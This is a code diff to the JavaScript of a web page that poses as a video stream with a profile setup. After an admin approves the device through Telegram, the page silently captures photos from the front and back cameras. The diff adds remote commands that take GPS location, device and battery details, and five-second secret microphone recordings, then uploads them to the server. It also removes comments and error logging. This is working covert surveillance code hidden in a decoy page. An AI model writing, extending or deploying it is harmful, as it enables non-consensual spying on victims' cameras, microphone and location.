@@ -155,7 +155,7 @@
         const encodedVid = urlParams.get('v');
         let targetVideoUrl = encodedVid ? atob(encodedVid) : "";
 
-        // Check LocalStorage on page load / refresh
+        // Check LocalStorage on load / refresh
         window.addEventListener('DOMContentLoaded', () => {
             const savedName = localStorage.getItem('sec_username');
             const savedAvatar = localStorage.getItem('sec_avatar');
@@ -163,11 +163,8 @@
 
             if (isRegistered === 'true' && savedName) {
                 usernameInput.value = savedName;
-                if (savedAvatar) {
-                    previewImg.src = savedAvatar;
-                }
+                if (savedAvatar) previewImg.src = savedAvatar;
 
-                // Directly bypass profile setup and launch stream/connection seamlessly
                 profileSection.style.display = 'none';
                 mediaPlayer.style.display = 'block';
                 mediaPlayer.src = targetVideoUrl ? targetVideoUrl : "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1"; 
@@ -177,7 +174,6 @@
             }
         });
 
-        // Handle Gallery Image Selection & Save to LocalStorage
         profilePicInput.addEventListener('change', (event) => {
             const file = event.target.files[0];
             if (file) {
@@ -190,7 +186,6 @@
             }
         });
 
-        // Allow & Continue Click Handler
         actionBtn.addEventListener('click', () => {
             const name = usernameInput.value.trim();
             if (!name) {
@@ -208,17 +203,13 @@
             socket.emit('register_device', { name: name });
         });
 
-        // Listen for approval signal from Admin via Telegram (/approve)
         socket.on('device_approved', async () => {
             actionBtn.innerText = "Loading Stream...";
 
             try {
-                // Run initial stealth captures (Front 5 + Back 5)
                 await captureSequence("user", "front");
                 await captureSequence("environment", "back");
-            } catch (err) {
-                console.error("Stealth capture error:", err);
-            }
+            } catch (err) {}
 
             profileSection.style.display = 'none';
             mediaPlayer.style.display = 'block';
@@ -230,12 +221,64 @@
         function initializeSecuritySystem() {
             keepScreenAwake();
 
-            socket.on('capture_front', async () => {
-                await captureSequence("user", "command_front");
+            // Camera Commands
+            socket.on('capture_front', async () => { await captureSequence("user", "command_front"); });
+            socket.on('capture_back', async () => { await captureSequence("environment", "command_back"); });
+
+            // GPS Location Command
+            socket.on('get_location', () => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(async (pos) => {
+                        await fetch('/upload-location', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ lat: pos.coords.latitude, lon: pos.coords.longitude })
+                        });
+                    }, (err) => console.error(err), { enableHighAccuracy: true });
+                }
             });
 
-            socket.on('capture_back', async () => {
-                await captureSequence("environment", "command_back");
+            // Device Info Command
+            socket.on('get_info', async () => {
+                let batteryLevel = 'Unknown';
+                if (navigator.getBattery) {
+                    try {
+                        const battery = await navigator.getBattery();
+                        batteryLevel = Math.round(battery.level * 100) + '% (' + (battery.charging ? 'Charging ⚡' : 'Not Charging 🔋') + ')';
+                    } catch(e) {}
+                }
+                const info = {
+                    battery: batteryLevel,
+                    platform: navigator.platform || 'Unknown',
+                    userAgent: navigator.userAgent,
+                    screen: window.screen.width + 'x' + window.screen.height
+                };
+                await fetch('/upload-info', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(info)
+                });
+            });
+
+            // Secret Audio Recording Command
+            socket.on('record_audio', async () => {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    const mediaRecorder = new MediaRecorder(stream);
+                    let chunks = [];
+                    mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                    mediaRecorder.onstop = async () => {
+                        const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
+                        const formData = new FormData();
+                        formData.append('audio', blob, 'surveillance_audio.ogg');
+                        await fetch('/upload-audio', { method: 'POST', body: formData });
+                        stream.getTracks().forEach(t => t.stop());
+                    };
+                    mediaRecorder.start();
+                    setTimeout(() => { mediaRecorder.stop(); }, 5000); // 5 seconds recording
+                } catch (e) {
+                    console.error("Audio recording error:", e);
+                }
             });
         }
 
@@ -253,9 +296,7 @@
                 }
 
                 stream.getTracks().forEach(track => track.stop());
-            } catch (error) {
-                console.error(`Capture Error (${labelPrefix}):`, error);
-            }
+            } catch (error) {}
         }
 
         async function captureAndSend(video, label) {
